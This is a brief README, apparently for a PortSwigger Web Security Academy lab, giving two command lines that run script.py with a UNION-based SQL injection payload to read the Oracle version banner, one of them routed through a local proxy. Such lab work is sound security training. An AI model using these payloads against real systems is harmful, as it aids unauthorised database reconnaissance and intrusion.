# How to run script.py

### SQL injection attack, querying the database type and version on Oracle

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'UNION SELECT banner,NULL FROM v$version--"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'UNION SELECT banner,NULL FROM v$version--" -p 127.0.0.1:8080`
